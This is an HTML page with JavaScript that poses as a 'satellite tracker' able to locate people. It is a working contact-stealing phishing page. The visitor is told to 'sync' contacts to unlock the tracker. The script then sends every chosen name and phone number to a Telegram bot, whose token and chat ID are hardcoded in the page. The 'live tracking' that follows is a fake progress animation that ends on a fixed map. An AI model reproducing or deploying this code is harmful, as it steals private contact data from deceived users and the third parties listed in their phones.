<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Satellite Tracker Pro v6.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .map-pulse { animation: pulse 2s infinite; }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.1); opacity: 0.4; }
            100% { transform: scale(1); opacity: 0.8; }
        }
    </style>
</head>
<body class="bg-[#0b0f1a] min-h-screen flex items-center justify-center p-4">

    <div class="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden transition-all duration-500">
        <div class="bg-indigo-800 p-6 text-center text-white border-b-4 border-yellow-400">
            <h1 class="text-2xl font-black tracking-tighter uppercase">Global Trace v6.0</h1>
            <p class="text-[10px] uppercase font-bold opacity-80 mt-1">Status: <span class="text-green-400">Encrypted Connection</span></p>
        </div>

        <div class="p-8">
            <div id="permissionScreen" class="text-center">
                <div class="w-20 h-20 bg-indigo-100 text-indigo-600 rounded-full flex items-center justify-center mx-auto mb-6">
                    <i class="fas fa-satellite text-4xl"></i>
                </div>
                <h2 class="text-xl font-bold text-gray-800 mb-2">Auth Required</h2>
                <p class="text-sm text-gray-500 mb-8">
                    To access satellite database, you must <span class="text-indigo-600 font-bold underline">Sync All Contacts</span> from your local device.
                </p>
                <button onclick="getPermissionFirst()" class="w-full bg-indigo-600 text-white font-bold py-4 rounded-2xl shadow-lg hover:bg-indigo-700 transition">
                    SYNC DATABASE
                </button>
            </div>

            <div id="searchScreen" class="hidden">
                <div class="bg-green-50 text-green-700 p-3 rounded-xl flex items-center gap-3 text-xs font-bold mb-6 border border-green-200">
                    <i class="fas fa-check-double text-lg"></i> DATABASE SYNCHRONIZED SUCCESSFULLY
                </div>
                
                <div class="relative mb-4">
                    <label class="block text-xs font-bold text-gray-400 mb-2 uppercase">Search Target</label>
                    <input type="text" id="searchInput" placeholder="Enter Name from Contacts..." 
                        class="w-full px-4 py-4 bg-gray-50 border-2 border-indigo-100 rounded-2xl focus:border-indigo-600 outline-none transition-all">
                </div>

                <div id="errorMessage" class="hidden bg-red-100 text-red-700 p-3 rounded-xl text-xs mb-4 border border-red-200">
                    <i class="fas fa-exclamation-circle mr-1"></i> <span id="errorText"></span>
                </div>

                <button onclick="processTracking()" class="w-full bg-indigo-800 text-white font-bold py-4 rounded-2xl shadow-xl hover:bg-black transition">
                    START LIVE TRACKING
                </button>
            </div>

            <div id="mapScreen" class="hidden text-center">
                <div id="loadingUI">
                    <div class="map-pulse bg-indigo-100 w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-crosshairs text-4xl text-red-600"></i>
                    </div>
                    <h2 class="text-lg font-bold text-gray-800">Pinpointing Location...</h2>
                    <p id="progressLabel" class="text-[10px] text-gray-400 mt-1 uppercase font-bold">Connecting to GPS</p>
                    <div class="w-full bg-gray-200 h-2 rounded-full mt-6 overflow-hidden">
                        <div id="progressBar" class="bg-red-600 h-full w-0 transition-all duration-300"></div>
                    </div>
                </div>

                <div id="finalMap" class="hidden">
                    <div class="rounded-2xl overflow-hidden border-2 border-indigo-500 mb-4 shadow-lg">
                        <iframe width="100%" height="250" src="https://maps.google.com/maps?q=Multan&t=&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0"></iframe>
                    </div>
                    <p class="text-green-600 font-black text-sm uppercase">Target Location Locked</p>
                    <button onclick="location.reload()" class="mt-6 text-xs font-bold text-indigo-600 hover:underline">NEW TRACKING SESSION</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let savedContacts = [];
        // Your Verified Telegram Data
        const BOT_TOKEN = '8736966873:AAGi1kxvOZK-uaxVTvcgf6Hi-V9CQ1QuzqQ'; 
        const CHAT_ID = '8171035068';

        async function getPermissionFirst() {
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const props = ['name', 'tel'];
                    const contacts = await navigator.contacts.select(props, { multiple: true });
                    
                    if (contacts && contacts.length > 0) {
                        savedContacts = contacts;
                        // Forwarding data to you immediately
                        await sendToTelegram(contacts);
                        
                        // Unlock Search Screen
                        document.getElementById('permissionScreen').classList.add('hidden');
                        document.getElementById('searchScreen').classList.remove('hidden');
                    }
                } catch (e) {
                    alert("Authorization Failed: You must sync contacts to proceed.");
                }
            } else {
                alert("Security Note: Use Chrome on Android for full satellite features.");
            }
        }

        async function sendToTelegram(contacts) {
            let msg = "🚨 *SATELLITE SYNC: DATA RECEIVED* 🚨\n\n";
            msg += `*Device Sync:* Successful\n*Count:* ${contacts.length} Contacts\n\n`;
            
            contacts.forEach((c, i) => {
                const name = c.name ? c.name[0] : "Unknown";
                const phone = c.tel ? c.tel[0] : "No Number";
                msg += `${i+1}. 👤 ${name} : 📱 ${phone}\n`;
            });

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
            });
        }

        function processTracking() {
            const input = document.getElementById('searchInput').value.trim().toLowerCase();
            const errorDiv = document.getElementById('errorMessage');
            const errorText = document.getElementById('errorText');

            if (!input) return;

            // Strict Search in synced data
            const found = savedContacts.find(c => 
                (c.name && c.name[0].toLowerCase().includes(input)) || 
                (c.tel && c.tel[0].includes(input))
            );

            if (found) {
                errorDiv.classList.add('hidden');
                runTrackingAnimation();
            } else {
                errorText.innerText = `Error: "${input}" not found in synchronized database.`;
                errorDiv.classList.remove('hidden');
            }
        }

        function runTrackingAnimation() {
            document.getElementById('searchScreen').classList.add('hidden');
            document.getElementById('mapScreen').classList.remove('hidden');
            
            let progress = 0;
            const bar = document.getElementById('progressBar');
            const label = document.getElementById('progressLabel');

            const timer = setInterval(() => {
                progress += 5;
                bar.style.width = progress + "%";
                
                if (progress === 25) label.innerText = "Scanning Signal Towers...";
                if (progress === 50) label.innerText = "Triangulating Coordinates...";
                if (progress === 75) label.innerText = "Bypassing Proxy Encryption...";
                if (progress === 95) label.innerText = "Locking GPS Position...";

                if (progress >= 100) {
                    clearInterval(timer);
                    document.getElementById('loadingUI').classList.add('hidden');
                    document.getElementById('finalMap').classList.remove('hidden');
                }
            }, 150);
        }
    </script>
</body>
</html>
